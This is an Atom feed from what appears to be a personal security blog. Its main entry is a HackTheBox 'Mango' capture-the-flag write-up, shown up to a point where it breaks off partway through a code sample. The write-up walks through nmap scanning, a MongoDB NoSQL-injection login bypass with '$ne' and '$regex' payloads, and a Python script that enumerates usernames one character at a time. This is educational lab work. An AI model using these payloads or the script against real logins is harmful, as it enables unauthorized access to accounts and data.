<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-06T10:54:09+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">InfoSecBlog</title><author><name>GitHub User</name></author><entry><title type="html">HTB-Magic</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html" rel="alternate" type="text/html" title="HTB-Magic" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;

&lt;p&gt;Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application.&lt;/p&gt;</content><author><name>GitHub User</name></author><category term="Hack The Box" /><category term="HTB" /><category term="Magic" /><summary type="html">Brief Summary Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application.</summary></entry><entry><title type="html">HTB-Mango</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html" rel="alternate" type="text/html" title="HTB-Mango" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;
&lt;p&gt;Hello, this is my first writeup and it’s going to be about HackTheBox: Mango machine. The box is retired now which means we can talk about it publicly. I personally enjoyed playing mango machine, I learned new stuff and had fun.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/machine.png&quot; alt=&quot;machine&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;
&lt;p&gt;Starting off, with &lt;strong&gt;nmap&lt;/strong&gt; to get an idea about the machine and the services running. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap 10.10.10.162 -A&lt;/code&gt; will provide us with os detection, versions of serviecs running if applicable and traceroute of the target.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nmap&quot;&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 20:40 +03
Nmap scan report for 10.10.10.162
Host is up (0.096s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|    2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|    256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open   ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_   http/1.1

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;from the output of nmap, we can note that there is a web application running on port 80/443 and has a certificate with a domain name registered as &lt;strong&gt;staging-order.mango.htb&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;when i visited port &lt;strong&gt;80&lt;/strong&gt; i got Forbidden response from server. So i visited port &lt;strong&gt;443&lt;/strong&gt; instead. but the page didnt load completely, the broweser notified me for connection not secured, which is weird. So i looked to into the certificate and found this domain &lt;strong&gt;staging-order.mango.htb&lt;/strong&gt; mango that got caught previously with nmap. i accepted the risk and continued. The page loaded completely:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the search engine doesn’t work yet. and ‘Analytics’ was a rabit hole believe me. i spent hours and got put with nothing. lets start burp suite, and intrecpt the traffic. First thing i will do, is to add the hostname resolution rule in burp -&amp;gt; project options -&amp;gt; connections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this time i visited the new domain, and found a login page. intresting…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lots of mangos appearently. the machine name and these pictures. Lets fuzz the login page little bit with different sql injection techniques. We should also include NoSql. Since you know, MongoDB is one of popular Databases and the box name is some how rhyme with it.&lt;/p&gt;

&lt;h1 id=&quot;nosql-injection--more-enumeratation&quot;&gt;NoSql Injection &amp;amp; More Enumeratation&lt;/h1&gt;
&lt;p&gt;lets capture the login request with &lt;strong&gt;Burp Suite&lt;/strong&gt;, and send it to repteater.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After trying many things, and looking online for useful articles about slqi on MongoDB. 
&lt;a href=&quot;https://nullsweep.com/a-nosql-injection-primer-with-mongo&quot;&gt;Found this article&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And The way to inject the parameters will be like&lt;/p&gt;

&lt;p&gt;original POST data:&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;username=admin&amp;amp;password=&amp;amp;login=login&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;injected with NoSql attack:&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=admin&amp;amp;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&amp;amp;login=login&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[$ne]&lt;/code&gt; we specify that stored data in the DB should not be equal to our input.
here we have a redirection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;following that a successful login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but it looks like the page is not completed yet and it has username/email admin@mango.htb . Anyway lets enumerate more usernames.
By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[$regex]&lt;/code&gt; we tell the server to use ‘Regular Expressing’ for our input and search for it in the database.
Enumerating the login page with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username[$regex]=^a&amp;amp;password[$ne]=&amp;amp;login=login&lt;/code&gt; as POST data that gets send to the server with payload of  &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; ^&lt;/code&gt;&lt;/strong&gt; to specify the search for the first letter only, and a because it is the begining of ‘admin’ account.&lt;/p&gt;

&lt;p&gt;and it looks like we have a successful login too.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets try ‘&lt;strong&gt;d&lt;/strong&gt;’ .&lt;/p&gt;

&lt;p&gt;the response status code was not 302 (redirection). Meaning that there is no account name that starts with ‘d’ in our case. We can enumrate letter by letter or we can automate this with python.&lt;/p&gt;

&lt;p&gt;Here a python script that will enumerate usernames.&lt;/p&gt;

&lt;p&gt;Note: i routed the script traffic to Burp Suite through &lt;strong&gt;localhost&lt;/strong&gt; port &lt;strong&gt;8080&lt;/strong&gt; for debugging purposes. If you are not using burp please remove the lines from 6-14&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# python3 nosql-enum.py
&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;  
  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;#=================================================
&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# to send this script traffic through Burp Suite
&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://localhost:8080'&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http_proxy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'HTTP_PROXY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https_proxy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'HTTPS_PROXY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# =================================================
&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://staging-order.mango.htb'&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'PHPSESSID='&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rqst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;username[$regex]=^&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;password[$ne]=&amp;amp;login=login&quot;&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allow_redirects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/x-www-form-urlencoded'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;302&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;P1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;found so far: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'^'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'+'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt; 
 &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# to escape chars
&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;rqst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;          &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.*\$\$$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# exit condition if $ (end of line) was found will exit and print the string without $
&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;              &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;               &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;this is the string: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;               &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;rqst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;  
 &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rqst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;running with script python3 we get the following account name &lt;strong&gt;admin&lt;/strong&gt; as expected&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/mango/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets tweak the script little bit to be able to find another username. First thing we should add , ‘&lt;strong&gt;a&lt;/strong&gt;’ in line 34 just like this&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span 